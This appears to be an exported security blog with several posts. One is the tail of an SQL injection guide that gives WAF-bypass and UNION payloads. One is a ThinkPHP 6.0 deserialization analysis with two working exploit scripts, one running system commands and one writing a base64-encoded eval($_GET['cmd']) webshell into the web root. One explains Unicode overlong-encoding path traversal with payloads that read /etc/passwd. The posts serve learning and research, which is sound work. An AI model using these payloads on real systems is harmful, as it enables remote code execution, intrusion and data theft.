<h3 id="Scientific-Notation-WAF-bypass"><a href="#Scientific-Notation-WAF-bypass" class="headerlink" title="Scientific Notation WAF bypass"></a>Scientific Notation WAF bypass</h3><p>You can find a more in depth explaination of this trick in <a href="https://www.gosecure.net/blog/2021/10/19/a-scientific-notation-bug-in-mysql-left-aws-waf-clients-vulnerable-to-sql-injection/">gosecure blog</a>.<br>Basically you can use the scientific notation in unexpected ways for the WAF to bypass it:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27; or 1.e(1) or &#x27;1&#x27;=&#x27;1</span><br><span class="line">-1&#x27; or 1337.1337e1 or &#x27;1&#x27;=&#x27;1</span><br><span class="line">&#x27; or 1.e(&#x27;&#x27;)=</span><br></pre></td></tr></table></figure>

<h3 id="Bypass-Column-Names-Restriction【限制】"><a href="#Bypass-Column-Names-Restriction【限制】" class="headerlink" title="Bypass Column Names Restriction【限制】"></a>Bypass Column Names <strong>Restriction【限制】</strong></h3><p>First of all, notice that if the <strong>original query and the table where you want to extract the flag from have the same amount of columns</strong> you might just do: <code>0 UNION SELECT * FROM flag</code></p>
<p>It’s possible to <strong>access the third column of a table without using its name</strong> using a query like the following: <code>SELECT F.3 FROM (SELECT 1, 2, 3 UNION SELECT * FROM demo)F;</code>, so in an sqlinjection this would looks like:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># This is an example with 3 columns that will extract the column number 3</span></span><br><span class="line">-1 UNION SELECT 0, 0, 0, F.3 FROM (SELECT 1, 2, 3 UNION SELECT * FROM demo)F;</span><br></pre></td></tr></table></figure>

<p>Or using a <strong>comma bypass</strong>:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># In this case, it&#x27;s extracting the third value from a 4 values table and returning 3 values in the &quot;union select&quot;</span></span><br><span class="line">-1 union select * from (select 1)a <span class="built_in">join</span> (select 2)b <span class="built_in">join</span> (select F.3 from (select * from (select 1)q <span class="built_in">join</span> (select 2)w <span class="built_in">join</span> (select 3)e <span class="built_in">join</span> (select 4)r union select * from flag <span class="built_in">limit</span> 1 offset 5)F)c</span><br></pre></td></tr></table></figure>

<p>This trick was taken from <a href="https://secgroup.github.io/2017/01/03/33c3ctf-writeup-shia/">https://secgroup.github.io/2017/01/03/33c3ctf-writeup-shia/</a></p>
<h3 id="WAF-bypass-suggester-tools"><a href="#WAF-bypass-suggester-tools" class="headerlink" title="WAF bypass suggester tools"></a>WAF bypass suggester tools</h3><p>url&#x3D;”<a href="https://github.com/m4ll0k/Atlas">https://github.com/m4ll0k/Atlas</a></p>
<h2 id="Other-Guides"><a href="#Other-Guides" class="headerlink" title="Other Guides"></a>Other Guides</h2><ul>
<li><a href="https://sqlwiki.netspi.com/">https://sqlwiki.netspi.com/</a></li>
<li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection</a></li>
</ul>
<h2 id="Brute-Force-Detection-List"><a href="#Brute-Force-Detection-List" class="headerlink" title="Brute-Force Detection List"></a>Brute-Force Detection List</h2><p>url&#x3D;”<a href="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/sqli.txt&quot;">https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/sqli.txt&quot;</a></p>
]]></content>
      <categories>
        <category>SQLi</category>
      </categories>
      <tags>
        <tag>SQLi</tag>
        <tag>注入</tag>
      </tags>
  </entry>
  <entry>
    <title>ThinkPHP6.0.*反序列化漏洞-2</title>
    <url>/2022/03/18/ThinkPHP6-0-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-2/</url>
    <content><![CDATA[<h2 id="0x01-搭建环境"><a href="#0x01-搭建环境" class="headerlink" title="0x01-搭建环境"></a>0x01-搭建环境</h2><p>详见前文</p>
<h2 id="0x02-利用条件"><a href="#0x02-利用条件" class="headerlink" title="0x02-利用条件"></a>0x02-利用条件</h2><p>详见前文</p>
<h2 id="0x03-知识要点"><a href="#0x03-知识要点" class="headerlink" title="0x03-知识要点"></a>0x03-知识要点</h2><p>官方文档介绍 ThinkPHP 6.* 启动方式是在终端输入 <code>php think run</code>，启动之后会在终端滚动显示应用运行的情况。通过测试，当通过 <code>system</code> 函数在终端下执行如下形式，<code>system([],&quot;`whoami`&quot;)</code>，可正式执行 <code>whoami</code> 函数，这是由于 shell 中的优先级高，所以会先执行 &#96;&#96; 中的内容，再把执行结果拼接成一个新命令，但是实际上system函数是报错的，所以实际环境不一定会显示出执行后的报错信息。</p>
<p><img src="https://raw.githubusercontents.com/sing3r/image/main/hexoImage16286640471.png"></p>
<p><img src="https://raw.githubusercontents.com/sing3r/image/main/hexoImage16286645101.png"></p>
<h2 id="0x04-构造POP"><a href="#0x04-构造POP" class="headerlink" title="0x04-构造POP"></a>0x04-构造POP</h2><h3 id="搜索-destruct-方法"><a href="#搜索-destruct-方法" class="headerlink" title="搜索 __destruct 方法"></a>搜索 __destruct 方法</h3><p>全文搜索 <code>__destruct</code> ，发现 <code>/vendor/league/flysystem-cached-adapter/src/Storage/AbstractCache.php</code> 存在该方法，尝试从该点出发挖掘反序列化漏洞。根据 <code>__destruct</code> 方法代码可知，当 <code>$this-&gt;autosave= false</code> 的时候，会进入 <code>$this-&gt;save()</code> 方法。</p>
<h3 id="跟进-save-方法"><a href="#跟进-save-方法" class="headerlink" title="跟进 save() 方法"></a>跟进 save() 方法</h3><p>发现没有实现 <code>save()</code> 方法的代码，尝试查找继承了 AbstractCache 并且实现了 save 方法的继承类。找到如下：<code>/vendor/topthink/framework/src/think/filesystem/CacheStore.php</code> ，<code>save()</code> 方法实现如下：</p>
<p><strong>save()：</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">save</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable">$contents</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getForStorage</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable language_">$this</span>-&gt;store-&gt;<span class="title function_ invoke__">set</span>(<span class="variable">$this</span>-&gt;key, <span class="variable">$contents</span>, <span class="variable">$this</span>-&gt;expire);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>跟进 <code>getForStorage()</code> ，发现 <code>cleanContents()</code> 方法，跟进 <code>cleanContents()</code> 方法，该代码大概意思就是从<code> $contents[$path]</code> 列表中提取键名与 <code>[&#39;path&#39;, &#39;dirname&#39;, ...]</code> 相同键值对，同时更新 <code>$contents[$path]</code> 的值。未发现可利用方法。<br>返回getForStorage()，接下来的代码是reture一个经过json_encode处理的数组。</p>
<p><strong>getForStorage()：</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getForStorage</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable">$cleaned</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">cleanContents</span>(<span class="variable">$this</span>-&gt;cache);</span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">json_encode</span>([<span class="variable">$cleaned</span>, <span class="variable">$this</span>-&gt;complete]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>cleanContents()：</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">cleanContents</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$contents</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable">$cachedProperties</span> = <span class="title function_ invoke__">array_flip</span>([</span><br><span class="line"><span class="string">&#x27;path&#x27;</span>, <span class="string">&#x27;dirname&#x27;</span>, <span class="string">&#x27;basename&#x27;</span>, <span class="string">&#x27;extension&#x27;</span>, <span class="string">&#x27;filename&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;size&#x27;</span>, <span class="string">&#x27;mimetype&#x27;</span>, <span class="string">&#x27;visibility&#x27;</span>, <span class="string">&#x27;timestamp&#x27;</span>, <span class="string">&#x27;type&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;md5&#x27;</span>,</span><br><span class="line">]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$contents</span> <span class="keyword">as</span> <span class="variable">$path</span> =&gt; <span class="variable">$object</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">is_array</span>(<span class="variable">$object</span>)) &#123;</span><br><span class="line"><span class="variable">$contents</span>[<span class="variable">$path</span>] = <span class="title function_ invoke__">array_intersect_key</span>(<span class="variable">$object</span>, <span class="variable">$cachedProperties</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="variable">$contents</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>回到 <code>save()</code> 方法，继续观察后续代码。发现 <code>$this-&gt;store</code> 可以控制，即我们调用任意类的 set 方法，或者触发任意不存在 save 方法类的 <code>__call</code> 魔术方法。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">$this</span>-&gt;store-&gt;<span class="title function_ invoke__">set</span>(<span class="variable">$this</span>-&gt;key, <span class="variable">$contents</span>, <span class="variable">$this</span>-&gt;expire);</span><br></pre></td></tr></table></figure>

<p>找到<code>/vendor/topthink/framework/src/think/cache/driver/File.php</code></p>
<h3 id="跟进-set-方法"><a href="#跟进-set-方法" class="headerlink" title="跟进 set 方法"></a>跟进 set 方法</h3><p><code>getExpireTime()</code> 方法为获取过期时间。<br><code>getCacheKey()</code> 方法为获取文件存储名字。</p>
<h3 id="跟进serialize-方法"><a href="#跟进serialize-方法" class="headerlink" title="跟进serialize()方法"></a>跟进serialize()方法</h3><p>发现可利用点，<code>$serialize($data)</code>。其中 <code>$serialize</code> 由 <code>$this-&gt;options[&#39;serialize&#39;][0]</code> 控制，<code>$this-&gt;options[&#39;serialize&#39;][0]</code> 可控。<code>$data</code> 的来源为 $<code>contents = $this-&gt;getForStorage() --&gt; set($this-&gt;key, $contents, $this-&gt;expire) --&gt; set($name, $value, $expire = null) --&gt; serialize($value) --&gt; $serialize($data)</code> ，即 <code>$data</code> 源于<code>$this-&gt;getForStorage()</code>。上面已经跟进过 <code>getForStorage()</code> 方法，<code>getForStorage()</code> 方法中的<code>$cleaned</code> 、<code>$this-&gt;complete</code> 均可控，所以返回结果即可以控制。</p>
<p><strong>serialize():</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">serialize</span>(<span class="params"><span class="variable">$data</span></span>): <span class="title">string</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$data</span>)) &#123;</span><br><span class="line"><span class="keyword">return</span> (<span class="keyword">string</span>) <span class="variable">$data</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$serialize</span> = <span class="variable language_">$this</span>-&gt;options[<span class="string">&#x27;serialize&#x27;</span>][<span class="number">0</span>] ?? <span class="string">&quot;serialize&quot;</span>;</span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$serialize</span>(<span class="variable">$data</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$serialize</span>(<span class="variable">$data</span>));</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$serialize</span>(<span class="variable">$data</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p><img src="https://raw.githubusercontents.com/sing3r/image/main/hexoImage16286677451.png"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">$this</span>-&gt;autosave = <span class="literal">false</span></span><br><span class="line"><span class="variable language_">$this</span>-&gt;store = <span class="keyword">new</span> \think\cache\Driver\<span class="title function_ invoke__">File</span>()</span><br><span class="line"><span class="variable language_">$this</span>-&gt;<span class="variable language_">$this</span>-&gt;complete = <span class="string">&quot;`whoami`&quot;</span></span><br><span class="line"><span class="variable language_">$this</span>-&gt;options[<span class="string">&#x27;serialize&#x27;</span>][<span class="number">0</span>] = <span class="string">&quot;system&quot;</span></span><br></pre></td></tr></table></figure>

<p>调用过程如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">__destruct</span>()——&gt;<span class="title function_ invoke__">save</span>()——&gt;\think\cache<span class="title class_">\Driver\File</span>::<span class="title function_ invoke__">set</span>()——&gt;<span class="title function_ invoke__">serialize</span>()--&gt;<span class="variable">$serialize</span>(<span class="variable">$data</span>)</span><br></pre></td></tr></table></figure>

<h2 id="0x05-EXP"><a href="#0x05-EXP" class="headerlink" title="0x05-EXP"></a>0x05-EXP</h2><h3 id="EXP-1："><a href="#EXP-1：" class="headerlink" title="EXP_1："></a>EXP_1：</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">filesystem</span>&#123;</span><br><span class="line"> <span class="title class_">use</span> <span class="title class_">Psr</span>\<span class="title class_">SimpleCache</span>\<span class="title class_">CacheInterface</span>;</span><br><span class="line"> <span class="class"><span class="keyword">class</span> <span class="title">CacheStore</span></span></span><br><span class="line"><span class="class"> </span>&#123;</span><br><span class="line"> <span class="keyword">protected</span> <span class="variable">$store</span>;</span><br><span class="line"> <span class="keyword">protected</span> <span class="variable">$autosave</span>;</span><br><span class="line"> <span class="keyword">protected</span> <span class="variable">$complete</span>;</span><br><span class="line"> <span class="keyword">protected</span> <span class="variable">$key</span>;</span><br><span class="line"> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"> <span class="variable language_">$this</span>-&gt;autosave = <span class="literal">false</span>;</span><br><span class="line"> <span class="variable language_">$this</span>-&gt;key = <span class="string">&quot;1&quot;</span>;</span><br><span class="line"> <span class="variable language_">$this</span>-&gt;store = <span class="keyword">new</span> \think\cache\Driver\<span class="title function_ invoke__">File</span>();</span><br><span class="line"> <span class="variable language_">$this</span>-&gt;complete=[<span class="string">&quot;`whoami`&quot;</span>];</span><br><span class="line"> &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">CacheStore</span>();</span><br><span class="line"> <span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">cache</span>\<span class="title class_">driver</span> &#123;</span><br><span class="line"> <span class="title class_">use</span> <span class="title class_">think</span>\<span class="title class_">cache</span>\<span class="title class_">Driver</span>;</span><br><span class="line"> <span class="class"><span class="keyword">class</span> <span class="title">File</span></span></span><br><span class="line"><span class="class"> </span>&#123;</span><br><span class="line"> <span class="keyword">protected</span> <span class="variable">$options</span> = [</span><br><span class="line"> <span class="string">&#x27;expire&#x27;</span> =&gt; <span class="number">0</span>,</span><br><span class="line"> <span class="string">&#x27;cache_subdir&#x27;</span> =&gt; <span class="literal">true</span>,</span><br><span class="line"> <span class="string">&#x27;prefix&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;path&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;hash_type&#x27;</span> =&gt; <span class="string">&#x27;md5&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;data_compress&#x27;</span> =&gt; <span class="literal">false</span>,</span><br><span class="line"> <span class="string">&#x27;tag_prefix&#x27;</span> =&gt; <span class="string">&#x27;tag:&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;serialize&#x27;</span> =&gt; [],</span><br><span class="line"> ];</span><br><span class="line"> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line"> <span class="variable language_">$this</span>-&gt;options[<span class="string">&#x27;serialize&#x27;</span>][<span class="number">0</span>] = <span class="string">&quot;system&quot;</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="EXP-2（文件写入操作，与上面大同小异，不做论述）："><a href="#EXP-2（文件写入操作，与上面大同小异，不做论述）：" class="headerlink" title="EXP_2（文件写入操作，与上面大同小异，不做论述）："></a>EXP_2（文件写入操作，与上面大同小异，不做论述）：</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">filesystem</span>&#123;</span><br><span class="line"> <span class="title class_">use</span> <span class="title class_">Psr</span>\<span class="title class_">SimpleCache</span>\<span class="title class_">CacheInterface</span>;</span><br><span class="line"> <span class="class"><span class="keyword">class</span> <span class="title">CacheStore</span></span></span><br><span class="line"><span class="class"> </span>&#123;</span><br><span class="line"> <span class="keyword">protected</span> <span class="variable">$store</span>;</span><br><span class="line"> <span class="keyword">protected</span> <span class="variable">$autosave</span>;</span><br><span class="line"> <span class="keyword">protected</span> <span class="variable">$complete</span>;</span><br><span class="line"> <span class="keyword">protected</span> <span class="variable">$key</span>;</span><br><span class="line"> <span class="keyword">protected</span> <span class="variable">$expire</span>;</span><br><span class="line"> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"> <span class="variable language_">$this</span>-&gt;autosave = <span class="literal">false</span>;</span><br><span class="line"> <span class="variable language_">$this</span>-&gt;key = <span class="string">&quot;shell&quot;</span>;</span><br><span class="line"> <span class="variable language_">$this</span>-&gt;store = <span class="keyword">new</span> \think\cache\Driver\<span class="title function_ invoke__">File</span>();</span><br><span class="line"> <span class="variable language_">$this</span>-&gt;expire = <span class="number">1</span>;</span><br><span class="line"> <span class="variable language_">$this</span>-&gt;complete=<span class="string">&quot;aaaaPD9waHAgZXZhbCgkR0VUWyJjbWQiXSk7Pz4=&quot;</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">CacheStore</span>();</span><br><span class="line"> <span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">cache</span>\<span class="title class_">driver</span> &#123;</span><br><span class="line"> <span class="title class_">use</span> <span class="title class_">think</span>\<span class="title class_">cache</span>\<span class="title class_">Driver</span>;</span><br><span class="line"> <span class="class"><span class="keyword">class</span> <span class="title">File</span></span></span><br><span class="line"><span class="class"> </span>&#123;</span><br><span class="line"> <span class="keyword">protected</span> <span class="variable">$options</span> = [</span><br><span class="line"> <span class="string">&#x27;expire&#x27;</span> =&gt; <span class="number">0</span>,</span><br><span class="line"> <span class="string">&#x27;cache_subdir&#x27;</span> =&gt; <span class="literal">false</span>,</span><br><span class="line"> <span class="string">&#x27;prefix&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;path&#x27;</span> =&gt; <span class="string">&#x27;php://filter/write=convert.base64-decode/resource=/var/www/html/thinkphp6.0-dev/public/&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;hash_type&#x27;</span> =&gt; <span class="string">&#x27;md5&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;data_compress&#x27;</span> =&gt; <span class="literal">false</span>,</span><br><span class="line"> <span class="string">&#x27;tag_prefix&#x27;</span> =&gt; <span class="string">&#x27;tag:&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;serialize&#x27;</span> =&gt; [],</span><br><span class="line"> ];</span><br><span class="line"> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line"> <span class="variable language_">$this</span>-&gt;options[<span class="string">&#x27;serialize&#x27;</span>] = [];</span><br><span class="line"> &#125;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h2><p><a href="https://www.dazhuanlan.com/naiyouhzu/topics/1541898">https://www.dazhuanlan.com/naiyouhzu/topics/1541898</a></p>
]]></content>
      <categories>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>PHP</tag>
        <tag>反序列化</tag>
        <tag>ThinkPHP</tag>
        <tag>WEB安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Unicode 相关漏洞及利用</title>
    <url>/2022/04/13/Unicode-%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%88%A9%E7%94%A8/</url>
    <content><![CDATA[<h1 id="unicode-相关漏洞"><a href="#unicode-相关漏洞" class="headerlink" title="unicode 相关漏洞"></a>unicode 相关漏洞</h1><h2 id="0x01-unicode-的解析错误漏洞"><a href="#0x01-unicode-的解析错误漏洞" class="headerlink" title="0x01- unicode 的解析错误漏洞"></a>0x01- unicode 的解析错误漏洞</h2><p>也许不该叫漏洞，但实在不知道用什么描述比较适用！！</p>
<h3 id="奇怪的-payload"><a href="#奇怪的-payload" class="headerlink" title="奇怪的 payload"></a>奇怪的 payload</h3><p>以前在进行一些枚举的时候，会发现字典里面有一些很奇怪的 payload，但一直没有思考为什么会这样，只是奉行 “拿来主义”，直接使用，直至最近才突然想理清楚这些原理。**”奇怪的 payload”** 如下所示：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 以下 payload 来自著名FUZZ工具--WFUZZ内置字典：https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-nix.txt</span><br><span class="line"></span><br><span class="line">..%c0%af/etc/passwd</span><br><span class="line">..%c0%af..%c0%af/etc/passwd</span><br><span class="line">..%c0%af..%c0%af..%c0%af/etc/passwd</span><br><span class="line">..%c0%af..%c0%af..%c0%af..%c0%af/etc/passwd</span><br><span class="line">..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af/etc/passwd</span><br><span class="line">..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af/etc/passwd</span><br><span class="line">..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af/etc/passwd</span><br><span class="line">..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af/etc/passwd</span><br><span class="line">...</span><br><span class="line">..%c0%2f/etc/passwd</span><br><span class="line">..%c0%2f..%c0%2f/etc/passwd</span><br><span class="line">..%c0%2f..%c0%2f..%c0%2f/etc/passwd</span><br><span class="line">..%c0%2f..%c0%2f..%c0%2f..%c0%2f/etc/passwd</span><br><span class="line">..%c0%2f..%c0%2f..%c0%2f..%c0%2f..%c0%2f/etc/passwd</span><br><span class="line">..%c0%2f..%c0%2f..%c0%2f..%c0%2f..%c0%2f..%c0%2f/etc/passwd</span><br><span class="line">..%c0%2f..%c0%2f..%c0%2f..%c0%2f..%c0%2f..%c0%2f..%c0%2f/etc/passwd</span><br><span class="line">..%c0%2f..%c0%2f..%c0%2f..%c0%2f..%c0%2f..%c0%2f..%c0%2f..%c0%2f/etc/passwd</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<h3 id="刨根问底"><a href="#刨根问底" class="headerlink" title="刨根问底"></a>刨根问底</h3><p>payload 中，为什么会存在使用 <code>%C0%AF</code> 或 <code>%C0%2F</code> 代替 <code>/</code> 的情况？对于目录遍历漏洞，这种代替真的有效吗！？其实，对于一些比较渣的 Unicode 解析应用程序是真的有效的。</p>
<h4 id="前提知识点一：URL编码知识"><a href="#前提知识点一：URL编码知识" class="headerlink" title="前提知识点一：URL编码知识"></a><strong>前提知识点一：URL编码知识</strong></h4><p>URL 编码也称为百分比编码，是一种简单编码方式，URL编码中的 <code>%xx</code> 表示一个字节（0-255 的数字），其中每个 <code>x</code> 是一个十六进制数字。因此，URL 中的 <code>%C0%AF</code> 对应于将字节 <code>C0 AF</code> 放入解码后的 URL，即 字节 192 (<code>1100 0000</code>) 和字节 175 (<code>1010 1111</code>)，而 <code>%C0%2F</code> 对应于字节 192 (<code>1100 0000</code>) 和字节 47 (<code>0010 1111</code>)</p>
<h4 id="前提知识点二：UTF-8-编码知识"><a href="#前提知识点二：UTF-8-编码知识" class="headerlink" title="前提知识点二：UTF-8 编码知识"></a><strong>前提知识点二：UTF-8 编码知识</strong></h4><p>UTF-8使用的是 <strong>8位码元</strong> 的变长码元序列编码方式（一码元 &#x3D; <code>1 byte</code> &#x3D; <code>8 bits</code>）。注意，UTF-8的码元长度是固定的8位，但编码后形成的码元序列长度不是固定的。UTF-8一般使用1到4个字节编码，当然也可以更长。例如：</p>
<ol>
<li>一码元（<code>1 byte</code> &#x3D; <code>8 bits</code>）序列长度字符表示为：<code>0xxxxxxx</code>；</li>
<li>双码元（<code>2 byte</code> &#x3D; <code>16 bits</code>）序列长度字符表示为：<code>110xxxxx 10xxxxxx</code>；</li>
<li>三码元（<code>3 byte</code> &#x3D; <code>24 bits</code>）序列长度字符表示为：<code>1110xxxx 10xxxxxx 10xxxxxx</code> ；</li>
<li>四码元（<code>4 byte</code> &#x3D; <code>32 bits</code>）序列长度字符表示为：<code>1110xxxx 10xxxxxx 10xxxxxx 10xxxxxx</code> ；</li>
</ol>
<p>所以。如某个字符在 ASCII 字符集内，由于其值只需要一码元（<code>1 byte</code> &#x3D; <code>8 bits</code>）就可以表示，所以该字符经过 UTF-8 编码后，表示为 <code>0xxxxxxx</code> ，表示方式仍然与原始的 ASCII 文档的编码相同。</p>
<p><strong>UTF-8编码方式的算法：</strong> </p>
<p>首字节用于区分编码的字节数，即，从首字节就能判断出编码后有多少个字节。规则为：除单字节编码以 <code>0</code> 开头外，多字节编码首字节 <code>1</code> 的个数用于判断编码后的字节长度，然后紧接着以数字 <code>0</code> 作为终结标志，除首字节外，多字节编码的后续字节以 <code>10</code> 开头，具体规则如表5所示</p>
<p><img src="https://img-blog.csdnimg.cn/20201231182051351.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h5b25naWxmbW1t,size_16,color_FFFFFF,t_70"></p>
<p><strong>UTF-8编码方法</strong></p>
<ol>
<li>在 表5 中查找字符的码点所在的码点范围，以确定应使用几个字节编码该字符</li>
<li>将字符的码点转换为二进制</li>
<li>将转换后的二进制数值从右到左(即从最后一位低位开始)依次按相同顺序填充 表5 中的 x，多出的 x 填充 0。</li>
<li>示例：“汉”的Unicode的码点是 <code>U+6C49</code> (<code>1101100 01001001</code>) ，其编码过程如下：<ul>
<li><code>6C49</code> 在 表5 的码点范围为 <code>U+0800 ~ U+FFFF</code>，所以应使用 3 个字节编码</li>
<li>将 <code>6C49</code> 的二进制数 <code>110 1100 0100 1001</code> 从最后一位开始，按从右向左的顺序填充 表5 中的 x，最终得到 “汉” 字的 UTF-8 编码为 <code>1110 0110 1011 0001 1000 1001</code> (<code>0xE6 B189</code>)，如下图所示</li>
</ul>
</li>
</ol>
<p><img src="https://img-blog.csdnimg.cn/2020123118211124.png"></p>
<p><strong>前提知识点三：</strong></p>
<p>ASCII 只定义 字节 0-127 的符号。对于特殊符号（例如，对于非英语国家）对 ASCII 最常见的扩展是 Unicode。 Unicode 将 <code>/</code> 之类的符号转换为由数字表示的码点（code point）；例如，<code>/</code> 是第 47 个码点（十六进制 <code>0x2f</code>），<code>π</code> 是第 960 个码点（<code>0x3c0</code>），<code>♥</code> 是第 9829 个码点（<code>0x2665</code>）。现在要将 unicode 符号放入字节流中，必须对其进行编码，常见的编码是 UTF-8，因为 UTF-8 继续以单个字节（8 bits）编码 ASCII 字符，所以它不会破坏原始 ASCII 字符集的编码。注意 ASCII 只定义了 128 个符号，它们的第一位都是 0（ASCII 中有效比特位为7位，值介于 0-127 之间，如: <code>/</code> 二进制表示为 <strong>0</strong>0101111）。</p>
<p><img src="https://www.runoob.com/wp-content/uploads/2015/05/2011050311372042.png"></p>
